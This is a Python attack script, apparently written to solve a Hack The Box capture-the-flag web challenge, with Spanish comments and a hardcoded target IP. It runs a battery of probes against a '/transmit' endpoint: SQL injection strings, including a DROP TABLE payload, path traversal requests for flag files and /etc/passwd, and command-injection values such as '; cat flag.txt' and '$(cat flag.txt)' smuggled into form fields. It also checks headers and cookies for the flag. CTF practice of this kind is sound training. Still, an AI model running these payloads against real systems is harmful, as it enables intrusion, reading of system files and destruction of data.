#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 25: Revisar headers de respuesta
print("[*] INNOVACIÓN 25: Analizar headers HTTP")
s = requests.Session()
r = s.get(base_url)
print("Headers:")
for key, value in r.headers.items():
    print(f"  {key}: {value}")
    if 'flag' in value.lower() or 'htb' in value.lower():
        print(f"  [!] POSIBLE FLAG EN HEADER!")

# INNOVACIÓN 26: SQL injection en parámetros
print("\n[*] INNOVACIÓN 26: Intentar SQL injection")
s = requests.Session()
s.get(base_url)

payloads = [
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "'; DROP TABLE users--",
]

for payload in payloads:
    r = s.post(f'{base_url}/transmit', data={
        'freq': payload,
        'mod': payload,
        'bits': payload,
        'msg': payload
    })
    if 'HTB{' in r.text:
        print(f"[SUCCESS with SQLi]", re.findall(r'HTB\{[^}]+\}', r.text))
        break

# INNOVACIÓN 27: Path traversal
print("\n[*] INNOVACIÓN 27: Path traversal")
paths = [
    '/transmit/../flag',
    '/transmit/../../flag',
    '/../flag.txt',
    '/flag.txt',
    '/../../etc/passwd'
]

for path in paths:
    try:
        r = s.get(f'{base_url}{path}')
        if r.status_code == 200 and 'HTB{' in r.text:
            print(f"[SUCCESS at {path}]", re.findall(r'HTB\{[^}]+\}', r.text))
            break
    except:
        pass

# INNOVACIÓN 28: Revisar cookies
print("\n[*] INNOVACIÓN 28: Analizar cookies")
s = requests.Session()
r = s.get(base_url)
print("Cookies:")
for cookie in s.cookies:
    print(f"  {cookie.name}: {cookie.value}")
    if 'flag' in cookie.value.lower() or 'htb' in cookie.value.lower():
        print(f"  [!] POSIBLE FLAG EN COOKIE!")

# Intentar decodificar cookie
import base64
for cookie in s.cookies:
    try:
        decoded = base64.b64decode(cookie.value)
        print(f"  Decoded {cookie.name}: {decoded}")
        if b'HTB{' in decoded:
            print(f"  [SUCCESS] FLAG EN COOKIE!")
    except:
        pass

# INNOVACIÓN 29: Command injection
print("\n[*] INNOVACIÓN 29: Command injection")
cmd_payloads = [
    '; cat flag.txt',
    '&& cat flag.txt',
    '| cat flag.txt',
    '`cat flag.txt`',
    '$(cat flag.txt)'
]

for payload in cmd_payloads:
    r = s.post(f'{base_url}/transmit', data={
        'freq': payload,
        'mod': 'ASK',
        'bits': '1',
        'msg': 'A1F184FB'
    })
    if 'HTB{' in r.text:
        print(f"[SUCCESS with cmd injection]", re.findall(r'HTB\{[^}]+\}', r.text))
        break

print("\n[*] Innovaciones 25-29 completadas")
